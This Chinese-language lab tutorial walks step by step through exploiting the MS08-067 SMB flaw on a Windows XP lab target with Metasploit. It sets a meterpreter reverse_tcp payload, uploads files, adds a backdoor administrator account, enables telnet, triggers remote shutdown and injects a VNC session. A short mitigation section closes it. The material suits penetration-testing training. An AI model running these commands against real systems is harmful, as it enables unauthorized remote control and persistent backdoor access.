## 一、漏洞简介

MS08-067漏洞将会影响Windows 2000/XP/Server 2003/Vista/Server
2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。

如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和
Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。 此漏洞可能用于进行蠕虫攻击。
防火墙最佳做法和标准的默认防火墙配置有助于保护网络资源免受从企业外部发起的攻击。

## 二、网络拓扑

  

![](https://image.3001.net/images/20210523/1621742739_60a9d493d8aff0d10d7c5.png!small)

## 三、实现步骤

（1）首先确定kali为攻击机，windows
xp2为靶机(需打开445端口，默认为打开)。然后，在kali终端输入msfconsole，启动Metasploit工具

![1621742816_60a9d4e0e931bc3414115.png!small?1621742819067](https://image.3001.net/images/20210523/1621742816_60a9d4e0e931bc3414115.png!small?1621742819067)

（2）输入命令search ms08_067,查找关于ms08_067的漏洞模块。

![1621742866_60a9d512d03d54720ff66.png!small?1621742866888](https://image.3001.net/images/20210523/1621742866_60a9d512d03d54720ff66.png!small?1621742866888)

（3）输入如下命令，使用该漏洞模块

![1621742892_60a9d52c42689a17ab8ff.png!small?1621742892338](https://image.3001.net/images/20210523/1621742892_60a9d52c42689a17ab8ff.png!small?1621742892338)

（4）进入这个模块后，用show options 查看该模块需要配置的参数

![1621742919_60a9d5471d41971c12572.png!small?1621742919585](https://image.3001.net/images/20210523/1621742919_60a9d5471d41971c12572.png!small?1621742919585)

（5）设置靶机IP（xp2）: set RHOST 192.168.100.144 设置要执行的payload: set payload
windows/meterpreter/reverse_tcp 设置攻击机的IP（kali）：set LHOST 192.168.100.143
设置要攻击的目标操作系统类型：set target 10 用show options查看相关参数是否配置正确

![1621742946_60a9d5626f616bbc436eb.png!small?1621742947040](https://image.3001.net/images/20210523/1621742946_60a9d5626f616bbc436eb.png!small?1621742947040)

![1621742960_60a9d5709e2d4f11af380.png!small?1621742961215](https://image.3001.net/images/20210523/1621742960_60a9d5709e2d4f11af380.png!small?1621742961215)

（6）最后，输入exploit，回车运行,进入到特殊的payload---meterpreter，该payload在控制靶机之后，能够对靶机执行更多的渗透攻击。用
pwd查看靶机当前的工作路径，用ipconfig命令查看靶机的IP地址配置。

![1621742984_60a9d588c620f83a0fc31.png!small?1621742985515](https://image.3001.net/images/20210523/1621742984_60a9d588c620f83a0fc31.png!small?1621742985515)

（7）通过help命令，可以查看在Meterpreter下可以使用的命令及功能简介

![1621743008_60a9d5a0c4b02b724c8ab.png!small?1621743009679](https://image.3001.net/images/20210523/1621743008_60a9d5a0c4b02b724c8ab.png!small?1621743009679)

（8）输入shell命令进入WINXP，并在C盘下创建一个文件夹

![1621743030_60a9d5b69f4dfa197e1c8.png!small?1621743031125](https://image.3001.net/images/20210523/1621743030_60a9d5b69f4dfa197e1c8.png!small?1621743031125)

（9）按CTRL+Z（或输入exit），返回meterpreter

![1621743075_60a9d5e37462daa5a3f40.png!small?1621743075462](https://image.3001.net/images/20210523/1621743075_60a9d5e37462daa5a3f40.png!small?1621743075462)

（10）将saminside文件夹（该文件夹可以是任意文件夹）拷贝到KALI的 root用户下

![1621743109_60a9d60523657207ab6ab.png!small?1621743109082](https://image.3001.net/images/20210523/1621743109_60a9d60523657207ab6ab.png!small?1621743109082)

（11）将KALI下的saminside文件夹使用upload命令上传到windows xp的C:/saminside中

![1621743136_60a9d620c7afaf4efa79e.png!small?1621743136841](https://image.3001.net/images/20210523/1621743136_60a9d620c7afaf4efa79e.png!small?1621743136841)

（12）在XP中查看已上传成功的文件(也可以通过该命令上传木马程序等)

![1621743254_60a9d696770b175712887.png!small?1621743254503](https://image.3001.net/images/20210523/1621743254_60a9d696770b175712887.png!small?1621743254503)

（13）拿到Windows XP的控制权后，可以使用Windows
XP系统自带的命令添加用户（，将该用户添加到管理员组，让该用户具体管理员的权限；利用命令开启Windows
XP的telnet服务，用于远程登录Windows XP。

![1621743291_60a9d6bbc9618b91de707.png!small?1621743292682](https://image.3001.net/images/20210523/1621743291_60a9d6bbc9618b91de707.png!small?1621743292682)

    
    
    net user hacker 123456 /add
    
    //以上使用net命令在Windows XP中添加了一个用户，名为：hacker，密码为：123456 net localgroup administrators hacker /add
    
    //以上使用net命令，把hacker用户添加到Administrators管理员组中
    
    sc config tlntsvr start= auto
    
    //以上命令把Telnet服务从禁止，改为自动启动
    
    sc start tlntsvr
    
    //启动Telnet服务

（14）在Kali上用命令telnet远程登录到windows xp

![1621743364_60a9d70440e49caf1aecf.png!small?1621743364546](https://image.3001.net/images/20210523/1621743364_60a9d70440e49caf1aecf.png!small?1621743364546)

（15）拿到Windows XP的控制权后可以对靶机进行控制，如在攻击机上输入shutdown –r： 关机。到靶机上可以看到关闭系统倒计时的窗口。

![1621743387_60a9d71b131b05b373817.png!small?1621743387848](https://image.3001.net/images/20210523/1621743387_60a9d71b131b05b373817.png!small?1621743387848)

（16）在攻击机上输入shutdown –a:取消关机

![1621743411_60a9d733822e860295945.png!small?1621743411427](https://image.3001.net/images/20210523/1621743411_60a9d733822e860295945.png!small?1621743411427)

17）使用VNC，远程控制靶机

> 1） background
>
> 2） set payload windows/vncinject/reverse_tcp
>
> 3） set viewonly no

![1621743443_60a9d7535e77fcd9736eb.png!small?1621743443364](https://image.3001.net/images/20210523/1621743443_60a9d7535e77fcd9736eb.png!small?1621743443364)

![1621743458_60a9d762b1288aecaf8bb.png!small?1621743458812](https://image.3001.net/images/20210523/1621743458_60a9d762b1288aecaf8bb.png!small?1621743458812)

![1621743471_60a9d76fe0bd6128fc141.png!small?1621743473744](https://image.3001.net/images/20210523/1621743471_60a9d76fe0bd6128fc141.png!small?1621743473744)

（18）建议和安全措施：

对于像ms08-067这种重大远程漏洞发生时，对于不需要实时连接的系统，可以考虑先断网检测安全配置，然后采用调整防火墙和安全策略的方式保证联网打补丁时段的安全再打补丁，还有就是桌面系统如果不提供共享打印，不需要在局域网游戏(如CS、FIFA等)中作为主机使用，可以通过设置为禁止发布发起连接模式，来阻断所有向本主机发起的连接的。进行有关设置不会影响到操作者的浏览、聊天、下载、在线视频、常见网游等操作。

